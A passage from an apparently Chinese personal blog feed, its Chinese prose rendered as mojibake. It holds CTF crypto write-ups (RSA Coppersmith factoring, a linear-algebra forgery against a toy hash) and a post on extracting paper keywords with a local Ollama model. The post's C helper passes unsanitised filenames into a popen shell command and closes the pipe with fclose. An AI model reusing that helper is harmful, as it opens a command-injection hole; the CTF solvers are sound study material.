class="hljs-number">0.499</span>, epsilon=<span class="hljs-number">0.02</span>)<br>    <span class="hljs-keyword">if</span>(res != []):<br>        t = <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])<br>        p = e*(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>*t + i) + pl<br>        q = n // p<br>        <span class="hljs-keyword">assert</span> p * q == n <span class="hljs-keyword">and</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q)<br>        <span class="hljs-built_in">print</span>(sha256(<span class="hljs-built_in">str</span>(p).encode()).hexdigest()[:<span class="hljs-number">32</span>])<br>        <span class="hljs-built_in">print</span>(sha256(<span class="hljs-built_in">str</span>(q).encode()).hexdigest()[:<span class="hljs-number">32</span>])<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">with</span> multiprocessing.Pool(processes=<span class="hljs-number">16</span>) <span class="hljs-keyword">as</span> pool:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> tqdm.tqdm(pool.imap(copper_attack, <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>)), total=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>)):<br>        <span class="hljs-keyword">if</span>(_):<br>            <span class="hljs-keyword">break</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1c56d344aba19600db3956abebc34425</span><br><span class="hljs-string">c1864501fab1841178177d4f15af4ad8</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="su_hash"><a class="markdownIt-Anchor" href="#su_hash"></a> *SU_hash</h3><h4 id="é¢˜ç›®-4"><a class="markdownIt-Anchor" href="#é¢˜ç›®-4"></a> é¢˜ç›®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;SUCTF&#123;??????????????????????????????&#125;&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myhash</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n</span>):<br>        <span class="hljs-variable language_">self</span>.g = <span class="hljs-number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span><br>        <span class="hljs-variable language_">self</span>.n = n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self,msg: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)):<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.g * (<span class="hljs-number">2</span> * <span class="hljs-variable language_">self</span>.n + msg[i])<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.n &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">383</span>) - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> ((<span class="hljs-variable language_">self</span>.n - <span class="hljs-number">0xd1ef3ad53f187cc5488d19045</span>) % (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>)).to_bytes(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;big&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">x, y</span>):<br>    x = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(x)) + x<br>    y = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(y)) + y<br>    <span class="hljs-keyword">return</span> long_to_bytes(bytes_to_long(<span class="hljs-built_in">bytes</span>([a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x, y)])))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg, n0</span>):<br>    h = myhash(n0)<br>    ret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> msg:<br>        h.update(<span class="hljs-built_in">bytes</span>([b]))<br>        ret = xor(ret,h.digest())<br>    <span class="hljs-keyword">return</span> ret<br><br>n0 = getRandomNBitInteger(<span class="hljs-number">382</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n0 = &quot;</span>,n0)<br>your_input = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;give me your msg -&gt;&quot;</span>).strip())<br><span class="hljs-keyword">if</span> fn(your_input, n0) == <span class="hljs-string">b&#x27;justjusthashhash&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;try again?&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜-4"><a class="markdownIt-Anchor" href="#è§£é¢˜-4"></a> è§£é¢˜</h4><p>ï¼ˆç¯å¢ƒæ²¡äº†ï¼Œè‡ªå·±æ­çš„æœ‰é—®é¢˜ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç¨‹åºè·‘äº†ï¼‰<br />ç›´æ¥æŠ„é¸¡å—å¸ˆå‚…çš„äº†ï¼Œè¿˜æ˜¯ä¸€çŸ¥åŠè§£çŠ¶æ€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myhash</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n</span>):<br>        <span class="hljs-variable language_">self</span>.g = <span class="hljs-number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span><br>        <span class="hljs-variable language_">self</span>.n = n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self,msg: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)):<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.g * (<span class="hljs-number">2</span> * <span class="hljs-variable language_">self</span>.n + msg[i])<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.n &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">383</span>) - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>((<span class="hljs-variable language_">self</span>.n - <span class="hljs-number">0xd1ef3ad53f187cc5488d19045</span>) % (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>)).to_bytes(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;big&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">x, y</span>):<br>    x = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(x)) + x<br>    y = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(y)) + y<br>    <span class="hljs-keyword">return</span> long_to_bytes(bytes_to_long(<span class="hljs-built_in">bytes</span>([a ^^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x, y)])))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg, n0</span>):<br>    h = myhash(n0)<br>    ret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> msg:<br>        h.update(<span class="hljs-built_in">bytes</span>([b]))<br>        ret = xor(ret,h.digest())<br>    <span class="hljs-keyword">return</span> ret<br><br><br><br>n0 = getRandomNBitInteger(<span class="hljs-number">382</span>)  <span class="hljs-comment"># å½“ä½œæ¥æ”¶</span><br><span class="hljs-comment"># æ¶ˆé™¤n0çš„å½±å“,ä½œä¸ºåˆå§‹çŠ¶æ€</span><br>t = (bytes_to_long(fn(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span>, n0))) % <span class="hljs-number">2</span>^<span class="hljs-number">128</span><br><br><span class="hljs-comment"># ç”¨ åˆå§‹çŠ¶æ€ å¼‚æˆ– æœ€ç»ˆçŠ¶æ€ å¾—åˆ° fn(è¾“å…¥çŠ¶æ€)</span><br>R = vector(GF(<span class="hljs-number">2</span>), <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bin</span>((bytes_to_long(<span class="hljs-string">b&quot;justjusthashhash&quot;</span>) ^^ t) % <span class="hljs-number">2</span>^<span class="hljs-number">128</span>)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">128</span>))))<br><br><span class="hljs-comment"># å› ä¸ºmyhashæ˜¯çº¿æ€§å˜åŒ–æ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨çŸ©é˜µæ±‚è§£</span><br><span class="hljs-comment"># + b&quot;\x00&quot;*128 ä¹Ÿæ˜¯ä¸ºäº†æ¶ˆé™¤n0çš„å½±å“</span><br>L = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    temp = long_to_bytes(i, <span class="hljs-number">1</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span><br>    L.append(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bin</span>(bytes_to_long(fn(temp, <span class="hljs-number">0</span>)))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">128</span>))))<br>L = Matrix(GF(<span class="hljs-number">2</span>), L)<br>res = L.solve_left(R)<br><br>msg = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span><br><span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res):<br>    <span class="hljs-keyword">if</span>(j == <span class="hljs-number">1</span>):<br>        msg += (long_to_bytes(i, <span class="hljs-number">1</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(fn(msg,n0))<br><span class="hljs-built_in">print</span>(fn(msg, n0) == <span class="hljs-string">b&quot;justjusthashhash&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æå–å­¦æœ¯è®ºæ–‡ä¸­çš„KEYWORDS</title>
    <link href="/2025/01/08/expdfkey/"/>
    <url>/2025/01/08/expdfkey/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºä¸åŒæœŸåˆŠå’Œä¸åŒä½œè€…å¯¹å­¦æœ¯è®ºæ–‡ä¸­keywordséƒ¨åˆ†è¦æ±‚ä¸åŒï¼Œç›´æ¥å†™ç¨‹åºæå–å¾ˆéš¾åšåˆ°æ™®é€‚æ€§ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åå°±å°è¯•äº†ä¸€ä¸‹ç›´æ¥ä½¿ç”¨å¤§æ¨¡å‹è¿›è¡Œæå–ï¼Œå‘ç°æ•ˆæœè¿˜ä¸é”™ï¼Œé¡ºä¾¿å°±æä¸€ä¸‹æœ¬åœ°å¤§æ¨¡å‹ã€‚ç›®å‰æ‰¾äº†IEEEã€ACMã€springerè¿™ä¸‰ä¸ªæœŸåˆŠçš„å‡ ç¯‡æ–‡ç« ï¼Œæ•ˆæœå¾ˆå¥½ï¼Œåº”è¯¥åªè¦æ ‡å‡†ç‚¹çš„éƒ½è¡Œã€‚</p><p>è¿™é‡Œä½¿ç”¨ollamaï¼Œå®‰è£…æ–¹ä¾¿ä¸”æ‹‰å–æ¨¡å‹ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚å…·ä½“å®‰è£…æ–¹æ³•æˆ‘å°±ä¸è¯´äº†ï¼Œå¾ˆç®€å•ï¼Œç½‘ä¸Šæ•™ç¨‹ä¹Ÿå¾ˆå¤šäº†ï¼Œä¸»è¦å°±æ˜¯ä¿®æ”¹å­˜å‚¨è·¯å¾„å•¥çš„ï¼Œè¿™é‡Œå°±å¸–ä¸€ä¸‹æˆ‘çš„ç¯å¢ƒå˜é‡ã€‚<strong>æ³¨æ„ï¼Œæƒ³è¦IPè°ƒç”¨éœ€è¦è®¾ç½®OLLAMA_HOSTã€‚</strong></p><p><img src="/imgs/expdfkey/1.png" alt="" /></p><p>æˆ‘è¿™é‡Œæ‰¾çš„æ¨¡å‹æ˜¯qwen2.5:14bï¼Œå…¶ä»–æ¨¡å‹æ²¡æœ‰å°è¯•<code>ollama pull qwen2.5:14b</code>ã€‚</p><p>ä¹‹ååœ¨å‘½ä»¤ä¸Šè¾“å…¥<code>ollama serve</code>ï¼Œå¯åŠ¨ollamaæœåŠ¡ï¼Œåé¢ç¨‹åºå°†è°ƒç”¨æœ¬åœ°æ¥å£ã€‚</p><p>ä¸‹é¢æ˜¯pythonä»£ç ï¼ˆç»“åˆGPTï¼‰ï¼Œé¦–å…ˆå¤„ç†è®ºæ–‡çš„PDFæ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨PyMuPDF(fitz)<code>pip install PyMuPDF</code>è¿™ä¸ªåº“æ¥å¤„ç†ï¼Œæ„Ÿè§‰æ•ˆæœæ¯”è¾ƒå¥½ï¼Œç„¶åå¤„ç†å‡ºç¬¬ä¸€é¡µï¼ˆå¤§éƒ¨åˆ†è®ºæ–‡çš„å…³é”®è¯åº”è¯¥éƒ½åœ¨ç¬¬ä¸€é¡µï¼‰,å¤„ç†æˆæ–‡æœ¬æ•°æ®ï¼Œå‘ç»™ollamaçš„APIæ¥å£ï¼Œé€‰æ‹©æ¨¡å‹ï¼Œè‡ªå·±è°ƒäº†ä¸€ä¸‹æç¤ºè¯ï¼Œç„¶åç­‰å¾…è¾“å‡ºï¼ˆå¹³å‡10s,3050tiç¡¬è·‘ã€‚ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> fitz<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># æå–PDFæ–‡æœ¬</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_text</span>(<span class="hljs-params">pdf_path</span>):<br>    doc = fitz.<span class="hljs-built_in">open</span>(pdf_path)  <span class="hljs-comment"># æ‰“å¼€PDFæ–‡ä»¶</span><br>    remaining_text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> doc:<br>        blocks = page.get_text(<span class="hljs-string">&quot;dict&quot;</span>)[<span class="hljs-string">&quot;blocks&quot;</span>]<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            <span class="hljs-keyword">if</span> block[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-number">0</span>:  <span class="hljs-comment"># åªå¤„ç†æ–‡æœ¬å—</span><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> block[<span class="hljs-string">&#x27;lines&#x27;</span>]:<br>                    <span class="hljs-keyword">for</span> span <span class="hljs-keyword">in</span> line[<span class="hljs-string">&#x27;spans&#x27;</span>]:<br>                        text = span[<span class="hljs-string">&#x27;text&#x27;</span>]<br>                        span_rect = fitz.Rect(span[<span class="hljs-string">&#x27;bbox&#x27;</span>])<br>                        remaining_text += (text+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># åªå¤„ç†ç¬¬ä¸€é¡µ</span><br>    <span class="hljs-keyword">return</span> remaining_text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ollama_extract_keywords</span>(<span class="hljs-params">url,text</span>):<br>    api=url<br>    data=&#123;<br>        <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;qwen2.5:14b&quot;</span>,<br>        <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-literal">False</span>,<br>        <span class="hljs-string">&quot;messages&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <br>                <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;On the first page of a paper, please extract all the keywords that come with it, only the keywords written by the author in the keyword section, and only tell me the results. Remember to remove all symbols, do not reply to other messages, and use commas to separate each keyword:\n<span class="hljs-subst">&#123;text&#125;</span>&quot;</span><br>            &#125;<br>        ],<br>        <span class="hljs-string">&quot;options&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0</span><br>        &#125;<br>    &#125;<br>    res=requests.post(url,json=data)<br>    <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>        keywords=res.json()<br>        <span class="hljs-keyword">return</span> keywords[<span class="hljs-string">&#x27;message&#x27;</span>][<span class="hljs-string">&#x27;content&#x27;</span>].strip()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><span class="hljs-comment"># å¤„ç†æ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰PDFæ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pdfs_in_folder</span>(<span class="hljs-params">url, file_path</span>):<br>        <br>    <span class="hljs-comment"># æå–PDFæ–‡æœ¬</span><br>    text = extract_text(file_path)<br><br>    results = []<br><br>    <span class="hljs-comment"># è°ƒç”¨ Ollama æ¨¡å‹è·å–å…³é”®è¯</span><br><br>    <span class="hljs-comment"># è§£æè¿”å›çš„ç»“æœå¹¶æå–å…³é”®è¯</span><br>    keywords_str = ollama_extract_keywords(url, text)<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> keywords_str:<br>        keywords_str = ollama_extract_keywords(url, text)<br>    keywords_list = process_keywords(keywords_str)  <span class="hljs-comment"># å¤„ç†å…³é”®è¯å­—ç¬¦ä¸²ï¼Œè¿”å›åˆ—è¡¨</span><br>    results = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> keywords_list:<br>        results.append(i.lower().replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>))<br><br>    <br>    <span class="hljs-keyword">return</span> results<br><br><span class="hljs-comment"># å¤„ç†è¿”å›çš„å…³é”®è¯å­—ç¬¦ä¸²å¹¶å°†å…¶è½¬æ¢ä¸ºåˆ—è¡¨</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_keywords</span>(<span class="hljs-params">keywords_str</span>):<br>    <span class="hljs-comment"># å‡è®¾å…³é”®è¯ä»¥é€—å·åˆ†éš”</span><br>    keywords = [keyword.strip() <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> keywords_str.split(<span class="hljs-string">&#x27;,&#x27;</span>)]<br>    <span class="hljs-keyword">return</span> keywords<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;--file&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Path of the PDF files&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;OLLAMA API URL&quot;</span>)<br>    args = parser.parse_args()<br><br>    file_path = args.file<br>    api_url = args.url<br><br>    results = process_pdfs_in_folder(api_url, file_path)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(i)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># python3 1.py -f &lt;filename&gt; -u &lt;api_url&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘æ¯•è®¾æ˜¯è¦ç”¨Cå†™çš„ï¼Œç„¶åè¿™é‡Œè´´ä¸€ä»½Cè°ƒç”¨å‘½ä»¤è·å–pythonè¾“å‡ºçš„ä»£ç ã€‚</p><p>ï¼ˆæˆ‘ä¸ä¼šå†™ï¼Œéƒ½æ˜¯é GPTçš„ï¼Œéš¾ç»·çš„åœ°æ–¹è½»å–·ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">extract_keywords_from_pdf_by_ollama</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *directoryPath, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *url, <span class="hljs-type">char</span> file_keywords[MAX_FILE_KEYWORDS][MAX_KEYWORD_LENGTH])</span><br>&#123;<br>    <span class="hljs-comment">// å®šä¹‰è°ƒç”¨ Python è„šæœ¬çš„å‘½ä»¤</span><br>    <span class="hljs-type">char</span> command[<span class="hljs-number">1024</span>];<br>    <span class="hljs-built_in">snprintf</span>(command, <span class="hljs-keyword">sizeof</span>(command), <span class="hljs-string">&quot;python3 1.py -f %s/%s -u %s&quot;</span>, directoryPath, filename, url);<br><br>    FILE *fp;<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">128</span>];<br><br>    <span class="hljs-comment">// æ‰“å¼€ç®¡é“ï¼Œè°ƒç”¨Pythonè„šæœ¬å¹¶è·å–è¾“å‡º</span><br>    fp = popen(command, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;popen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// è¯»å–Pythonè„šæœ¬çš„è¾“å‡º</span><br><br>    <span class="hljs-keyword">while</span> (fgets(result, <span class="hljs-keyword">sizeof</span>(result), fp) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(result);<br>        <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">isspace</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)result[len - <span class="hljs-number">1</span>]))<br>        &#123;<br>            len--;<br>        &#125;<br>        result[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-built_in">strcpy</span>(file_keywords[count++], result);<br>        <span class="hljs-keyword">if</span> (count &gt;= MAX_FILE_KEYWORDS)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å…³é—­ç®¡é“</span><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ollama</tag>
      
      <tag>python</tag>
      
      <tag>keyword</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ç¬¬ä¸€å±ŠSolaræ¯åº”æ€¥å“åº”æŒ‘æˆ˜èµ›</title>
    <link href="/2024/12/28/solar2024/"/>
    <url>/2024/12/28/solar2024/</url>
    
